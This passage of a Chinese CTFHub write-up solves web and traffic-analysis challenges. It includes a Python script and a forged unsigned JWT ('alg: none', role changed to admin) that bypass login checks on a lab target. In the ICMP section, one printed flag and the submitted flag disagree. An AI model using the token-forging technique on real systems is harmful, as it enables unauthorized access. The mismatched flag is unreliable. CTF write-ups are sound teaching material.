# Header: {'AG': '94c5111136fd32c}', 'typ': 'JWT', 'alg': 'HS256'}
print("Payload:", p)
# Payload: {'username': 'admin', 'password': '123', 'FL': 'ctfhub{d7d6a7e50'}
flag = p['FL']+h['AG']
print(flag)
# ctfhub{d7d6a7e5094c5111136fd32c}
```

如果是非断网离线环境，也可以直接用https://www.jwt.io/线上解密，非常直观清晰。

提交`ctfhub{d7d6a7e5094c5111136fd32c}`即可。

------

### 无签名

> 一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。

进入靶机后看到一个名为`Web Login`的登录框，包含账号、密码的输入框和登录按钮。

打开Chrome的`Network`抓包，随便输入测试一下。输入账号`admin`和密码`123`，看到以下回显信息：

> Hello admin(guest), only admin can get flag.

`(guest)`说明我们的登录角色其实并不是`admin`。

抓包后在`Cookie`中看到`token`信息如下：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Gj5LcMKKCyWHpGmZHhUAzchUQp_9Lwp7LkM2O5g1Cso
```

直接用https://www.jwt.io/线上解密，先用`JWT Decoder`拿到`Json`数据后再用`JWT Encoder`。

题目描述中说了：当alg字段为空时，后端将不执行签名验证。

修改`Header`数据中的`alg`为`none`。

```json
{
  "typ": "JWT",
  "alg": "none"
}
```

修改`Payload`数据中的`role`为`admin`。

```json
{
  "username": "admin",
  "password": "123",
  "role": "admin"
}
```

`JWT Encoder`生成的新JSON Web Token如下：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
```

当然，也可以编写`Python`代码求解：

```python
import json
import base64

def jwt_decode(token):
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    # 补全base64 padding并进行base64解码
    def _b64decode(s):
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)
    # 用loads加载json数据
    header = json.loads(_b64decode(parts[0]))
    payload = json.loads(_b64decode(parts[1]))
    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
    return header, payload, signature

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Gj5LcMKKCyWHpGmZHhUAzchUQp_9Lwp7LkM2O5g1Cso'
(h, p, s) = jwt_decode(token)
print("Header:", h)
# Header: {'typ': 'JWT', 'alg': 'HS256'}
print("Payload:", p)
# Payload: {'username': 'admin', 'password': '123', 'role': 'guest'}
# JWT无签名攻击 修改Header和Payload
h['alg'] = 'none'
print("Modified Header:", h)
# Modified Header: {'typ': 'JWT', 'alg': 'none'}
p['role'] = 'admin'
print("Modified Payload:", p)
# Modified Payload: {'username': 'admin', 'password': '123', 'role': 'admin'}
# 构造Base64URL
def jwt_encode(data):
    # 先转成 JSON 字符串（无空格）
    json_str = json.dumps(data, separators=(',', ':'))
    b64 = base64.b64encode(json_str.encode()).decode()
    # 转为 Base64Url：替换字符 + 移除填充
    return b64.replace('+', '-').replace('/', '_').rstrip('=')

def jwt_encode_nosign(header:json, payload:json):
    h = jwt_encode(header)
    p = jwt_encode(payload)
    nosign_jwt = f"{h}.{p}."
    return nosign_jwt

none_jwt = jwt_encode_nosign(h, p)
print("None JWT:", none_jwt)
# None JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
```

用`HackBar`构造`GET`请求，URL为靶机链接，点击`MODIFY HEADER`添加`Cookie`值。

```
token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
```

靶机的回显信息如下：

> Hello admin(admin), only admin can get flag.
> ctfhub{8dd8338632fdbd43ecb23d13}

提交`ctfhub{8dd8338632fdbd43ecb23d13}`即可。

------

# MISC

## 数据库类流量

### MySQL流量

下载附件后解压缩，用`WireShark`打开流量包`mysql.pcap`。输入`mysql`过滤出`MySQL`流量包，然后按`Ctrl+F`搜索字符串`ctfhub`，我们可以在一个流量包中看到`flag`字符串`ctfhub{mysql_is_S0_E4sy}`。

------

### Redis流量

下载附件后解压缩，用`WireShark`打开流量包`redis.pcap`。按`Ctrl+F`搜索字符串`ctfhub`，然后我们可以在一个流量包中看到一半的flag，另一半flag在另一个流量包中。

```
66	105.037564	30.0.250.11	30.0.30.10	RESP	119	Request: SET Fl4g1 ctfhub{6051d6123de43df
70	119.251861	30.0.250.11	30.0.30.10	RESP	115	Request: set flag2 ad7609804925c0121}
```

如果没有找到另一个流量包，可以直接追踪第一个流量包的`TCP`数据流拿到另一半`flag`字符串。

将字符串拼接为`ctfhub{6051d6123de43dfad7609804925c0121}`，提交`flag`即可。

------

### MongoDB流量

下载附件后解压缩，用`WireShark`打开流量包`mongodb.pcap`。输入`mongo`过滤出`MongoDB`流量包，然后`Ctrl+F`在分组字节流中查找`ctfhub{`，可以定位到以下数据包。

```
483	65.908966	30.0.250.11	30.0.30.10	MONGO	226	Request : Query
```

其中，可以看到关键字符串`ctfhub{5f284ecc279d2cbd1af258bb53c7a5f6}`，提交即可。

------

## ICMP协议流量分析

### Data

> ping 也可以携带数据?

下载附件后解压缩，用`WireShark`打开流量包`icmp_data.pcap`。可以看到所有的ICMP请求包，数据流量中A后面的那一个字母组合起来刚好是这道题的`flag`。

编写`Python`代码求解，将所有的ICMP数据包中的单个数据拼接起来获取`flag`。

```python
import pyshark

cap = pyshark.FileCapture(
    'icmp_data.pcap', 
    display_filter="icmp && icmp.type==8",
    tshark_path=r'E:\CTFTools\Wireshark\tshark.exe')

flag = ''
for packet in cap:
    try:
        data_hex = packet.icmp.data[16:18]
        flag += chr(int(data_hex,16))
        # flag += bytes.fromhex(data_hex).decode('utf-8')
    except:
        continue
cap.close()
print(flag)
# ctfhub{c87eb997966acb}
```

提交`ctfhub{c87eb99796406ac0b}`即可。

------

### Length

> ping 包的大小有些奇怪

下载附件后解压缩，用`WireShark`打开流量包`icmp_len.pcap`，根据题目名称注意到ICMP包的长度。

编写`Python`代码求解，将所有的ICMP数据包的长度转换为ASCII码后拼接起来获取`flag`。

```python
import pyshark

cap = pyshark.FileCapture(
    'icmp_len.pcap', 
    display_filter="icmp && icmp.type ==8",
    tshark_path=r'E:\CTFTools\Wireshark\tshark.exe')

flag = ''
for packet in cap:
    icmp_len = packet.icmp.data_len
    flag += chr(int(str(icmp_len)))

cap.close()
print(flag)
# ctfhub{acb659f023}
```

提交`ctfhub{acb659f023}`即可。

------

### LengthBinary

> ping 包的大小有些奇怪

下载附件后解压缩，用`WireShark`打开流量包`icmp_len_binary.pcap`，根据提示注意到ICMP数据包的长度都是32和64，结合题目可知这有可能是01字符串。编写`Python`代码求解，将所有的ICMP数据包的长度转换为01字符串后再转换成ASCII码字符串，以获取`flag`。

```python
import pyshark

cap = pyshark.FileCapture(
    'icmp_len_binary.pcap', 
    display_filter="icmp && icmp.type ==8",
    tshark_path=r'E:\CTFTools\Wireshark\tshark.exe')

s = ''
for packet in cap:
    icmp_len = int(str(packet.icmp.data_len))
    if icmp_len == 32:
        s += '0'
    else:   # icmp == 64
        s += '1'
# print(s)
def bin_to_ascii(bin_str):
    ascii_str = ''
    for i in range(0, len(bin_str), 8):
        byte = int(bin_str[i:i+8], 2)
        ascii_str += chr(byte)
    return ascii_str

flag = bin_to_ascii(s)
cap.close()
print(flag)
# ctfhub{04efed1e05}
```

提交`ctfhub{04efed1e05}`即可。

------
